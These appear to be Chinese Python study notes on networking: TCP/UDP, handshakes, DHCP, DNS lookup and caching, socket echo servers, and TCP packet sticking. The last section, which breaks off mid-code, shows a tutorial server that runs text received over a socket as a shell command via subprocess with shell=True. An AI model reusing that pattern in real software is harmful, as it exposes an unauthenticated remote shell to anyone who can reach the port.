## 传输层功能：建立端口到端口的通信
## 补充：端口范围0-65535，0-1023为系统占用端口

## 自定义协议需要注意的问题：
	#-1 两大组成部分= 头部 + 数据部分
    	# 头部:放对数据的描述信息
        	# 比如：数据要发给谁，数据的类型，数据的长度
        # 数据部分：想要发的数据
    #-2 头部的长度必须固定
    	# 因为接受端要通过头部获取所接收数据的详细信息
```

##### 4-1 tcp协议

```python
# Ethernet头 + IP头 + TCP头 + 应用层的头 + 应用层数据
## TCP头部：源端口，目标端口，....... （20字节）


## TCP协议工作方式：建立一个双向通信的链接
	C -------------------------------> S  客户端向服务端发数据
    C <-------------------------------> S  服务端向客户端发请求
 ## 三次握手建立链接------------为传数据做准备
	C									 S
    | -------------------------------------> |  第一次：发起跟服务端的链接请求
    |									  |
    |<---------------------------------------|	第二次：同意客户端的请求，并向客户端发链接请求
    |									  |
    |--------------------------------------->|	第三次：同意服务端同意
    |                     					|
    
## 四次握手断开链接-----------------由于断开链接时，由于链接内有数据传输，所以必须分四次断开
```

![image-20230705095634634](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705095634634.png)

```python
## tcp 发数据是可靠的（效率不高) ---------> 因为客户端发数据给服务端，服务端有个确认信息，客户端才会把内存数据清理掉
## 若果客户端发数据到服务端，服务端没回应，客户端会重发一份给服务端，反过来也是
	## 发送数据必须等到对方确认后才算完成，才会将自己内存中的数据清理掉
    
## 当服务端大量处于TIME_WAIT状态时意味着服务端正在经历高并发
```

##### 4-2 UDP协议

```python
## 为了提高传输效率，可以使用UDP协议，发数据不需要确认，发完就清理数据，不需要对方确认--------------但是不可靠
```

##### 10 -------- scoket 抽象层(套接字)

![image-20230705102939800](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705102939800.png)

#### 10.4.5 应用层

```python
## 应用层由来：用户使用的都是应用程序，均工作于应用层，互联网是开发的，大家都可以开发自己的应用程序，数据多种多样，必须规定好数据的组织形式 

## 应用层功能：规定应用程序的数据格式。

## 例：TCP协议可以为各种各样的程序传递数据，比如Email、WWW、FTP等等。那么，必须有不同协议规定电子邮件、网页、FTP数据的格式，这些应用程序协议就构成了”应用层”。
```

![image-20230705103142226](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705103142226.png)

#### 10.4.6 总结

![image-20230705103229540](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705103229540.png)

![img](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/1036857-20200415220004538-1827984001.gif)

### 10.5 网络通信实现

```python
## 想实现网络通信，每台主机需具备四要素
    ## 本机的IP地址
    ## 子网掩码
    ## 网关的IP地址
    ## DNS的IP地址
    ## 获取这四要素分两种方式
```

#### 10.5.1 DHCP协议(计算机获取自己的IP，子网掩码等等信息)

```python
#获取这四要素分两种方式
    # 1.静态获取
        # 即手动配置
    # 2.动态获取
        #通过dhcp获取
```

![image-20230705103936481](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705103936481.png)

```python
#（1）最前面的”以太网标头”，设置发出方（本机）的MAC地址和接收方（DHCP服务器）的MAC地址。前者就是本机网卡的MAC地址，后者这时不知道，就填入一个广播地址：FF-FF-FF-FF-FF-FF。

#（2）后面的”IP标头”，设置发出方的IP地址和接收方的IP地址。这时，对于这两者，本机都不知道。于是，发出方的IP地址就设为0.0.0.0，接收方的IP地址设为255.255.255.255。

#（3）最后的”UDP标头”，设置发出方的端口和接收方的端口。这一部分是DHCP协议规定好的，发出方是68端口，接收方是67端口。

# 这个数据包构造完成后，就可以发出了。以太网是广播发送，同一个子网络的每台计算机都收到了这个包。因为接收方的MAC地址是FF-FF-FF-FF-FF-FF，看不出是发给谁的，所以每台收到这个包的计算机，还必须分析这个包的IP地址，才能确定是不是发给自己的。当看到发出方IP地址是0.0.0.0，接收方是255.255.255.255，于是DHCP服务器知道”这个包是发给我的”，而其他计算机就可以丢弃这个包。

# 接下来，DHCP服务器读出这个包的数据内容，分配好IP地址，发送回去一个”DHCP响应”数据包。这个响应包的结构也是类似的，以太网标头的MAC地址是双方的网卡地址，IP标头的IP地址是DHCP服务器的IP地址（发出方）和255.255.255.255（接收方），UDP标头的端口是67（发出方）和68（接收方），分配给请求端的IP地址和本网络的具体参数则包含在Data部分。

# 新加入的计算机收到这个响应包，于是就知道了自己的IP地址、子网掩码、网关地址、DNS服务器等等参数
```

#### 10.5.2 DNS域名解析

```python
#  DNS的作用：在互联网中，其实没有类似于www.xxx.com这种域名方式，而替代的是以IP地址，如222.222.222.222，那我们在IE地址栏中应当输入222.222.222.222才能打开网站www.xxx.com，但我们细想一下，互联网上的网站成千上万，如果每个网站登陆都需要记住一大串数字，那是不是特别不方便，对于记忆力不强的人，根本无法记住这么烦琐的数字。这个时候DNS就出现了，它的作用就是将222.222.222.222解析为www.xxx.com，那么我们登陆的时候就直接输入域名就可以了。

#  为什么一定要设置DNS才能上网？有些朋友可能会发现，为什么我可能登陆QQ、MSN，但却打不开网页呢？其实大部分原因都是因为DNS服务器故障造成的，DNS服务器地址是唯一的，是运营商提供给终端用户用来解析IP地址及域名的关系，而如果不设定DNS服务器地址，那么就无法查询地址的去向，自然也就打不开网页，而QQ、MSN等即时聊天软件，采用的是UDP传输协议，即不可靠传输协议，无需提供DNS服务器地址，也同样可以登陆。


## DNS 查询域名用 UDP协议
```

#### 10.5.3 dns的两种查询方式

```python
#一 ：递归
##主机向本地域名服务器的查询一般都是采用递归查询。所谓递归查询就是：如果主机所询问的本地域名服务器不知道被查询的域名的IP地址，那么本地域名服务器就以DNS客户的身份，向其它根域名服务器继续发出查询请求报文(即替主机继续查询)，而不是让主机自己进行下一步查询。因此，递归查询返回的查询结果或者是所要查询的IP地址，或者是报错，表示无法查询到所需的IP地址。

# 二：迭代
## 本地域名服务器向根域名服务器的查询的迭代查询。迭代查询的特点：当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么给出所要查询的IP地址，要么告诉本地服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地服务器进行后续的查询。根域名服务器通常是把自己知道的顶级域名服务器的IP地址告诉本地域名服务器，让本地域名服务器再向顶级域名服务器查询。顶级域名服务器在收到本地域名服务器的查询请求后，要么给出所要查询的IP地址，要么告诉本地服务器下一步应当向哪一个权限域名服务器进行查询。最后，知道了所要解析的IP地址或报错，然后把这个结果返回给发起查询的主机。 
```

![image-20230705104951681](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705104951681.png)

![image-20230705105012071](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705105012071.png)

#### 10.5.4 域名解析例子

```python
#下面举一个例子演示整个查询过程：
'''
 假定域名为m.xyz.com的主机想知道另一个主机y.abc.com的IP地址。例如，主机m.xyz.com打算发送邮件给y.abc.com。这时就必须知道主机y.abc.com的IP地址。下面是图2的几个查询步骤：

        1、主机m.abc.com先向本地服务器dns.xyz.com进行递归查询。

        2、本地服务器采用迭代查询。它先向一个根域名服务器查询。

        3、根域名服务器告诉本地服务器，下一次应查询的顶级域名服务器dns.com的IP地址。

        4、本地域名服务器向顶级域名服务器dns.com进行查询。

        5、顶级域名服务器dns.com告诉本地域名服务器，下一步应查询的权限服务器dns.abc.com的IP地址。

        6、本地域名服务器向权限域名服务器dns.abc.com进行查询。

        7、权限域名服务器dns.abc.com告诉本地域名服务器，所查询的主机的IP地址。

        8、本地域名服务器最后把查询结果告诉m.xyz.com。

        
# 整个查询过程共用到了8个UDP报文。

        为了提高DNS查询效率，并减轻服务器的负荷和减少因特网上的DNS查询报文数量，在域名服务器中广泛使用了高速缓存，用来存放最近查询过的域名以及从何处获得域名映射信息的记录。

        例如，在上面的查询过程中，如果在m.xyz.com的主机上不久前已经有用户查询过y.abc.com的IP地址，那么本地域名服务器就不必向根域名服务器重新查询y.abc.com的IP地址，而是直接把告诉缓存中存放的上次查询结果(即y.abc.com的IP地址)告诉用户。

        由于名字到地址的绑定并不经常改变，为保持告诉缓存中的内容正确，域名服务器应为每项内容设置计时器并处理超过合理时间的项(例如每个项目两天)。当域名服务器已从缓存中删去某项信息后又被请求查询该项信息，就必须重新到授权管理该项的域名服务器绑定信息。当权限服务器回答一个查询请求时，在响应中都指明绑定有效存在的时间值。增加此时间值可减少网络开销，而减少此时间值可提高域名解析的正确性。

        不仅在本地域名服务器中需要高速缓存，在主机中也需要。许多主机在启动时从本地服务器下载名字和地址的全部数据库，维护存放自己最近使用的域名的高速缓存，并且只在从缓存中找不到名字时才使用域名服务器。维护本地域名服务器数据库的主机应当定期地检查域名服务器以获取新的映射信息，而且主机必须从缓存中删除无效的项。由于域名改动并不频繁，大多数网点不需花精力就能维护数据库的一致性。
'''

       
```

![image-20230705105145429](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705105145429.png)

#### 10.5.5  DNS解析流程举例

![image-20230705105249609](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705105249609.png)

```python 
'''
如上图所示，我们将详细阐述DNS解析流程。

1、首先客户端位置是一台电脑或手机，在打开浏览器以后，比如输入http://www.zdns.cn的域名，它首先是由浏览器发起一个DNS解析请求，
如果本地缓存服务器中找不到结果，则首先会向根服务器查询，根服务器里面记录的都是各个顶级域所在的服务器的位置，当向根请求http://www.zdns.cn的时候，
根服务器就会返回.cn服务器的位置信息。

2、递归服务器拿到.cn的权威服务器地址以后，就会寻问cn的权威服务器，知不知道http://www.zdns.cn的位置。这个时候cn权威服务器查找并返回http://zdns.cn服务器的地址。

3、继续向http://zdns.cn的权威服务器去查询这个地址，由http://zdns.cn的服务器给出了地址：202.173.11.10

4、最终才能进行http的链接，顺利访问网站。

5、这里补充说明，一旦递归服务器拿到解析记录以后，就会在本地进行缓存，如果下次客户端再请求本地的递归域名服务器相同域名的时候，就不会再这样一层一层查了，
因为本地服务器里面已经有缓存了，这个时候就直接把http://www.zdns.cn的A记录返回给客户端就可以了。
'''
```

#### 10.5.6 DNS缓存及分类

```python
# DNS缓存指DNS返回了正确的IP之后，系统就会将这个结果临时储存起来。并且它会为缓存设定一个失效时间 (例如N小时)，在这N小时之内，当你再次访问这个网站时，系统就会直接从你电脑本地的DNS缓存中把结果交还给你，而不必再去询问DNS服务器，变相“加速”了网址的解析。

# 当然，在超过N小时之后，系统会自动再次去询问DNS服务器获得新的结果。所以，当你修改了 DNS 服务器，并且不希望电脑继续使用之前的DNS缓存时，就需要手动去清除本地的缓存了。


## 分类
'''
1）浏览器DNS缓存（内存中): 浏览器会按照一定频率缓存DNS记录

2）本地操作系统DNS缓存(内存中): 如果浏览器缓存中找不到需要的DNS记录，那就去操作系统找。

3）本地HOSTS文件（硬盘中）: Windows系统中位于C:\Windows\System32\drivers\etc

4）路由器指定的DNS(远程): 路由器自动获取DNS地址，也可以手动修改-登录后台设置DNS服务器地址
　　ps：路由器DNS被篡改会造成域名劫持，你访问的网址都会被定位到同一个位置，但是IP直接可以访问

5）ISP的DNS服务器（远程）:  ISP(Internet Service Provider互联网服务提供商、联通电信移动)，ISP有专门的DNS服务器应 对DNS查询请求 

6）根服务器（远程，跨国）: ISP的DNS服务器还找不到的话，它就会向根服务器发出查询请求
'''

```

#### 10.5.7 浏览器DNS查找顺序

![image-20230705105706459](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705105706459.png)

```python
## 浏览器DNS缓存->本地系统DNS缓存->本地计算机HOSTS文件->ISP DNS缓存->递归or迭代搜索

## 期间如果查询到了，也就直接访问ip地址了，这个就像三级缓存原理一样，例如，能够在hosts文件中找到就不会再去查其他的
```

#### 10.5.8 清除DNS缓存

```python
##打开cmd执行命令：ipconfig /all
    ## 全国通用DNS地址（国内用户推荐使用，速度较快！）
    ## 首先DNS服务器地址添：114.114.114.114  (位于北京人民英雄纪念碑）
    ## 全球通用DNS地址（此DNS地址为谷歌服务器的）
    ## 首选DNS服务器地址添：8.8.8.8
    ## 备用DNS服务器地址添：8.8.4.4
 

# 查看本地dns缓存命令：ipconfig /displaydns
# 清除本地dns缓存命令：ipconfig /flushdns

# 清除浏览器缓存：
    # 我们在开发的时候，有时候会给某个域名绑hosts，用于本地开发测试，但是绑了之后，用谷歌浏览器访问会发现并没有生效，按F12会		发现访问的还是线上的ip，说明浏览器是有该域名的dns缓存的，那么如何清除浏览器的dns缓存呢？

# 1、针对谷歌浏览器
    #谷歌浏览器清除方法如下：打开浏览器，访问如下地址 chrome://net-internals/#dns

	# 点击 clear host cache，就清楚了浏览器的dns缓存，再访问绑hosts的域名，就会发现ip变啦

# 2、针对火狐浏览器
	# 如果是firefox火狐浏览器的话，可以按照以下方式：

	# 在地址栏中 about:config 并回车，可能会出现一个警告信息，直接点击按钮进入，会出现firefox的所有配置信息，通过搜索dns 进		行过滤，
	# 可以看到一项名为 network.dnsCacheExpirationGracePeriod 项，它对应的值就是DNS缓存的时间，双击此项，会出现修改的提示		框，填入 0
```



### 10.6 网络通信流程

```python
## 1.本机获取
    ## 本机的IP地址：192.168.1.100
    ## 子网掩码：255.255.255.0
    ## 网关的IP地址：192.168.1.1
    ## DNS的IP地址：8.8.8.8
    
## 2.打开浏览器，想要访问Google，在地址栏输入了网址：www.google.com。

## 3.dns协议(基于udp协议)

## 4.HTTP部分的内容，类似于下面这样：
'''
    GET / HTTP/1.1
    Host: www.google.com
    Connection: keep-alive
    User-Agent: Mozilla/5.0 (Windows NT 6.1) ……
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Encoding: gzip,deflate,sdch
    Accept-Language: zh-CN,zh;q=0.8
    Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
    Cookie: … …

'''
## 5 TCP协议
        ## TCP数据包需要设置端口，接收方（Google）的HTTP端口默认是80，发送方（本机）的端口是一个随机生成的1024-65535之间的				整数，假定为51775。

        ## TCP数据包的标头长度为20字节，加上嵌入HTTP的数据包，总长度变为4980字节。

 

## 6 IP协议
		## 然后，TCP数据包再嵌入IP数据包。IP数据包需要设置双方的IP地址，这是已知的，发送方是192.168.1.100（本机），接收方是				172.194.72.105（Google）。

			# IP数据包的标头长度为20字节，加上嵌入的TCP数据包，总长度变为5000字节。

 

## 7 以太网协议
'''
最后，IP数据包嵌入以太网数据包。以太网数据包需要设置双方的MAC地址，发送方为本机的网卡MAC地址，接收方为网关192.168.1.1的MAC地址（通过ARP协议得到）。

以太网数据包的数据部分，最大长度为1500字节，而现在的IP数据包长度为5000字节。因此，IP数据包必须分割成四个包。因为每个包都有自己的IP标头（20字节），所以四个包的IP数据包的长度分别为1500、1500、1500、560。
'''

```

![image-20230705110102549](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705110102549.png)

```python
## 8 服务器端响应
'''
经过多个网关的转发，Google的服务器172.194.72.105，收到了这四个以太网数据包。

根据IP标头的序号，Google将四个包拼起来，取出完整的TCP数据包，然后读出里面的”HTTP请求”，接着做出”HTTP响应”，再用TCP协议发回来。

本机收到HTTP响应以后，就可以将网页显示出来，完成一次网络通信。
'''

```

### 10.7  socket

#### 10.7.1 套接字是什么

```Python
## Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。在设计模式中，Socket其实就是一个门面模式，它把复杂的TCP/IP协议族隐藏在Socket接口后面，对用户来说，一组简单的接口就是全部，让Socket去组织数据，以符合指定的协议。

## 所以，我们无需深入理解tcp/udp协议，socket已经为我们封装好了，我们只需要遵循socket的规定去编程，写出的程序自然就是遵循tcp/udp标准的。

## 也有人将socket说成ip+port，ip是用来标识互联网中的一台主机的位置，而port是用来标识这台机器上的一个应用程序，ip地址是配置到网卡上的，而port是应用程序开启的，ip与port的绑定就标识了互联网中独一无二的一个应用程序

## 而程序的pid是同一台机器上不同进程或者线程的标识
```

#### 10.7.2 套接字工作流程

```python
'''
一个生活中的场景。你要打电话给一个朋友，先拨号，朋友听到电话铃声后提起电话，这时你和你的朋友就建立起了连接，就可以讲话了。等交流结束，挂断电话结束此次交谈。 生活中的场景就解释了这工作原理。
'''
```

![image-20230705111824044](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705111824044.png)

```python
## 先从服务器端说起。服务器端先初始化Socket，然后与端口绑定(bind)，对端口进行监听(listen)，调用accept阻塞，等待客户端连接。在这时如果有个客户端初始化一个Socket，然后连接服务器(connect)，如果连接成功，这时客户端与服务器端的连接就建立了。客户端发送数据请求，服务器端接收请求并处理请求，然后把回应数据发送给客户端，客户端读取数据，最后关闭连接，一次交互结束
```

#### 10.7.3 socket()模块函数用法

##### 3-1 基础用法

```python
### 服务端.py

    import socket

    ## 以打电话为例

    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，绑定手机卡
    phone.bind(('127.0.0.1',8080))

    ## 3，开机
    phone.listen(5)  ## 5 值得是半连接池的大小

    print(f'服务端启动，服务运行在127.0.0.1:8080')

    ## 4，等待电话连接请求，拿到电话连接conn
    conn,alient_addr = phone.accept()  ## 是个元祖
    print(conn)  ## 套接字对象
    print('客户端的IP和端口',alient_addr)  ## 客户端的IP和端口 ('127.0.0.1', 57424)

    ## 5，通信：收消息/发消息
    data = conn.recv(1024)  ## 1024 指最大接受的数据量为1024Bytes,收到的是Bytes类型
    print('客户端发来的消息：',data.decode('utf-8'))
    conn.send(data.upper())

    ## 6，关闭电话连接(一个电话连接结束了就应该断掉)
    conn.close() ## 挂断电话

    ## 7，可选：关机手机
    phone.close()


### 客户端.py
    import socket

    ## 以打电话为例

    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，拨通服务端电话
    ## 服务端的IP和端口
    phone.connect(('127.0.0.1',8080))  ##

    ## 3.通信
    phone.send('hello aini 哈哈哈哈'.encode('utf-8'))  ## 发送的是bytes类型的
    data = phone.recv(1024)
    print(data.decode('utf-8'))

    ## 4,关闭连接（必选)
    phone.close()


```

##### 3-2 通信循环

```python
## 服务端.py
    import socket

    ## 以打电话为例

    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，绑定手机卡
    phone.bind(('127.0.0.1',8080))

    ## 3，开机
    phone.listen(5)  ## 5 值得是半连接池的大小

    print(f'服务端启动，服务运行在127.0.0.1:8080')

    ## 4，等待电话连接请求，拿到电话连接conn
    conn,alient_addr = phone.accept()  ## 是个元祖
    print(conn)  ## 套接字对象
    print('客户端的IP和端口',alient_addr)  ## 客户端的IP和端口 ('127.0.0.1', 57424)

    ## 5，通信：收消息/发消息
    while True:
        data = conn.recv(1024)  ## 1024 指最大接受的数据量为1024Bytes,收到的是Bytes类型
        print('客户端发来的消息：',data.decode('utf-8'))
        conn.send(data.upper())

    ## 6，关闭电话连接(一个电话连接结束了就应该断掉)
    conn.close() ## 挂断电话


    ## 7，可选：关机手机
    phone.close()
    
## 客户端.py
    import socket

    ## 以打电话为例

    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，拨通服务端电话
    ## 服务端的IP和端口
    phone.connect(('127.0.0.1',8080))  ##

    ## 3.通信
    while True:
        user_input = input(">>>>>:").strip()
        if user_input == 'quit': break
        phone.send(user_input.encode('utf-8'))  ## 发送的是bytes类型的
        data = phone.recv(1024)
        print(data.decode('utf-8'))


    ## 4,关闭连接（必选)
    phone.close()
```

##### 3-3 socket收发消息的原理

##### ![image-20230705123710249](Python3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.assets/image-20230705123710249.png)

```python
## 客户端收发 和 服务端收发是独立的，并不是一次发对应一次收
## 客户端sned都是数据交给缓存，让操作系统调度网卡发，服务端发数据也是，而不是客户端和服务端直接一对一的传输
```



##### 3-4 修复bug1 (空格-阻塞)

```python
## bug 原因：输入空格以后，input时被去掉空格了，等于user_input = ''
## 客户端可以send的空容缓存，再由网卡发送，由于空数据，等于没数据，所以不会发空数据的
## 修正： 判断user_input 的长度

## 客户端.py
    import socket

    ## 以打电话为例
    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，拨通服务端电话
    ## 服务端的IP和端口
    phone.connect(('127.0.0.1',8080))  ##

    ## 3.通信
    while True:
        user_input = input(">>>>>:").strip()
        if user_input == 'quit': break
        if len(user_input) == 0: continue
        phone.send(user_input.encode('utf-8'))  ## 发送的是bytes类型的
        data = phone.recv(1024)
        print(data.decode('utf-8'))


    ## 4,关闭连接（必选)
    phone.close()
```

##### 3-5 bug2(客户端非正常死亡------导致服务端也异常)

```python
### 客户端直接关机，非正常停止脚本
    # window 服务端异常：ConnectionReseatError 
    # Linux  ： 通讯死循环（不断收空内容)
    
## 在unix系统中，一旦data收到的是空
## 意味着是以后昂异常行为：客户端非法断开了链接
   

## 解决服务端bug
	# linix: 服务端添加判断内容，对客户端传过来的数据进行判断，如果为空，直接break,
    
## 针对linix 系统修复bug    
    ## 5，通信：收消息/发消息
    while True:
        data = conn.recv(1024)  ## 1024 指最大接受的数据量为1024Bytes,收到的是Bytes类型
        if len(data) == 0: break  ## 空内容意味着异常，直接break
        print('客户端发来的消息：',data.decode('utf-8'))
        conn.send(data.upper())
        
## 针对Windows系统修复bug(添加异常处理)
    while True:
        try:
            data = conn.recv(1024)  ## 1024 指最大接受的数据量为1024Bytes,收到的是Bytes类型
            print('客户端发来的消息：',data.decode('utf-8'))
            conn.send(data.upper())
        except Exception:
            ## 6，关闭电话连接(一个电话连接结束了就应该断掉)
            conn.close() ## 挂断电话
            break
```

##### 3-6 链接循环（让服务端一直提供服务）

```python
## 服务端满足的条件，应该一直提供服务--------------添加链接循环

## 服务端代码
    import socket
    
    ## 以打电话为例

    # 1，买手机
    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    phone = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    ## 2，绑定手机卡
    phone.bind(('127.0.0.1',8080))

    ## 3，开机
    phone.listen(5)  ## 5 值得是半连接池的大小

    print(f'服务端启动，服务运行在127.0.0.1:8080')

    ## 链接循环
    while True:
        ## 4，等待电话连接请求，拿到电话连接conn
        conn,alient_addr = phone.accept()  ## 是个元祖
        print(conn)  ## 套接字对象
        print('客户端的IP和端口',alient_addr)  ## 客户端的IP和端口 ('127.0.0.1', 57424)

        ## 5，通信：收消息/发消息

        while True:
            try:
                data = conn.recv(1024)  ## 1024 指最大接受的数据量为1024Bytes,收到的是Bytes类型
                print('客户端发来的消息：',data.decode('utf-8'))
                conn.send(data.upper())
            except Exception:
                ## 6，关闭电话连接(一个电话连接结束了就应该断掉)
                conn.close() ## 挂断电话
                break
    phone.close()
```

##### 3-7半链接池

```python
 phone.listen(5)  ## 5 值得是半连接池的大小 
 ## 如果不是并发编程，服务端只能与一个链接进行会话，其他客户端的链接进入半连接池，等待链接，如果超过了半连接池的大小，则客户端无法跟服务端进行连接
```

### 10.8 基于UDP写一个套接字通信

```python
## 服务端
    import socket

    ## socket.SOCK_STREAM(流式协议) === TCP协议  sock.SOCK_DGRAM ===== UDP协议
    server = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)


    server.bind(('127.0.0.1',8080))

    print(f'服务端启动，服务运行在127.0.0.1:8080')
    while True:
        data,client_adddr = server.recvfrom(1024)
        print(data)
        print(client_adddr)
        server.sendto(data.decode('utf-8').upper().encode('utf-8'), client_adddr)

server.close()

    ## 服务端可以发送空数据
    ## 客户端断了，服务端不会有影响
    
## 客户端
    import socket

    ## socket.SOCK_STREAM(流式协议) === TCP协议  socket.SOCK_DGRAM ===== UDP协议
    client = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    while True:
        user_input = input(">>>>>:").strip()
        client.sendto(user_input.encode('utf-8'),('127.0.0.1',8080))
        data,server_addr = client.recvfrom(1024)
        print(data.decode('utf-8'),server_addr)

    client.close()
```

### 10.9  粘包

```python
## 须知：只有TCP有粘包现象，UDP永远不会粘包，为何，且听我娓娓道来
## 首先需要掌握一个socket收发消息的原理

## 所谓粘包问题主要还是因为接收方不知道消息之间的界限，不知道一次性提取多少字节的数据所造成的。
```

#### 10.9.1 粘包出现的原因及解决方案

```python
## tcp是流式协议。数据像水流一样粘在一起，没有任何边界区分

# 两种情况下会发生粘包。
	##发送端需要等缓冲区满才发送出去，造成粘包（发送数据时间间隔很短，数据了很小，会合到一起，产生粘包）
    
    ## 服务端
    	#_*_coding:utf-8_*_
        __author__ = 'Linhaifeng'
        from socket import *
        ip_port=('127.0.0.1',8080)

        tcp_socket_server=socket(AF_INET,SOCK_STREAM)
        tcp_socket_server.bind(ip_port)
        tcp_socket_server.listen(5)


        conn,addr=tcp_socket_server.accept()


        data1=conn.recv(10)
        data2=conn.recv(10)

        print('----->',data1.decode('utf-8'))
        print('----->',data2.decode('utf-8'))

        conn.close()
        
  ## 客户端 
    #_*_coding:utf-8_*_
    __author__ = 'Linhaifeng'
    import socket
    BUFSIZE=1024
    ip_port=('127.0.0.1',8080)

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    res=s.connect_ex(ip_port)


    s.send('hello'.encode('utf-8'))
    s.send('feng'.encode('utf-8'))
    
    ## 接收方不及时接收缓冲区的包，造成多个包接收（客户端发送了一段数据，服务端只收了一小部分，服务端下次再收的时候还是从缓冲区拿上次遗留的数据，产生粘包） 
    
    ## 服务端
        #_*_coding:utf-8_*_
        __author__ = 'Linhaifeng'
        from socket import *
        ip_port=('127.0.0.1',8080)

        tcp_socket_server=socket(AF_INET,SOCK_STREAM)
        tcp_socket_server.bind(ip_port)
        tcp_socket_server.listen(5)


        conn,addr=tcp_socket_server.accept()


        data1=conn.recv(2) #一次没有收完整
        data2=conn.recv(10)#下次收的时候,会先取旧的数据,然后取新的

        print('----->',data1.decode('utf-8'))
        print('----->',data2.decode('utf-8'))

        conn.close()
    ## 客户端
        #_*_coding:utf-8_*_
        __author__ = 'Linhaifeng'
        import socket
        BUFSIZE=1024
        ip_port=('127.0.0.1',8080)

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        res=s.connect_ex(ip_port)


        s.send('hello feng'.encode('utf-8'))
## 收数据没收干净，有残留，就跟下一次结果混在一起

## 解决的核心法门就是：每次都收干净，不要有残留


'''
此外，发送方引起的粘包是由TCP协议本身造成的，TCP为提高传输效率，发送方往往要收集到足够多的数据后才发送一个TCP段。若连续几次需要send的数据都很少，通常TCP会根据优化算法把这些数据合成一个TCP段后一次发送出去，这样接收方就收到了粘包数据。

TCP（transport control protocol，传输控制协议）是面向连接的，面向流的，提供高可靠性服务。收发两端（客户端和服务器端）都要有一一成对的socket，因此，发送端为了将多个发往接收端的包，更有效的发到对方，使用了优化方法（Nagle算法），将多次间隔较小且数据量小的数据，合并成一个大的数据块，然后进行封包。这样，接收端，就难于分辨出来了，必须提供科学的拆包机制。 即面向流的通信是无消息保护边界的。
UDP（user datagram protocol，用户数据报协议）是无连接的，面向消息的，提供高效率服务。不会使用块的合并优化算法，, 由于UDP支持的是一对多的模式，所以接收端的skbuff(套接字缓冲区）采用了链式结构来记录每一个到达的UDP包，在每个UDP包中就有了消息头（消息来源地址，端口等信息），这样，对于接收端来说，就容易进行区分处理了。 即面向消息的通信是有消息保护边界的。
tcp是基于数据流的，于是收发的消息不能为空，这就需要在客户端和服务端都添加空消息的处理机制，防止程序卡住，而udp是基于数据报的，即便是你输入的是空内容（直接回车），那也不是空消息，udp协议会帮你封装上消息头，实验略

'''


```

#### 

#### 10.9.2 粘包问题普通解决（不是很好的解决方法）

```python
## 第一种解决方法：-----------该接受的最大字节数（但不是很好的办法，也不能无限放大）
    while True:
        msg = input(">>>：").strip()
        if len(msg) == 0: continue
        client.send(msg.encode('utf-8'))

        res = client.recv(70000)  ## 本次接受最大接受1024个字节
        print(res.decode('gbk'),end='  ')

    
## 解决方法二
    while True:
        msg = input(">>>：").strip()
        if len(msg) == 0: continue
        client.send(msg.encode('utf-8'))
        lang = 1024
        while lang> 1023:
            res = client.recv(1024)  ## 本次接受最大接受1024个字节
            lang = len(res)
            print(res.decode('gbk'),end='  ')

```

#### 10.9.3 自定义协议解决粘包问题

```python
## 先收固定长度的头：解析出数据的描述信息，包括数据的总大小total_size
## 根据解析出的描述信息，total_size

## 服务端
    from socket import *
    import subprocess
    import struct

    ## 服务端应该满足两个条件
    ## 第一件事：一直对外提供服务
    ## 第二件事：能够并发的给多个服务端提供服务

    server = socket(AF_INET,SOCK_STREAM)
    server.bind(('127.0.0.1',8080))
    server.listen(5)

    ## 第一件事：循环的从半连接池中取出链接请求，与其建立双向链接，拿到链接对象
    while True:
        con,client_addr = server.accept()

        ## 第二件事：拿到链接对象，与其进行通信循环
        while True:
            try:
                res = con.recv(1024)  ## 最大8096 就可以
                if len(res) == 0: break
                obj = subprocess.Popen(
                    res.decode('utf-8'),
                    shell = True,
                    stdout = subprocess.PIPE,
                    stderr = subprocess.PIPE
                )
                std_succ = obj.stdout.read()  ## 拿到的结果都是是字节类型，但是window编码用的是gbk
                std_err = obj.stderr.read()
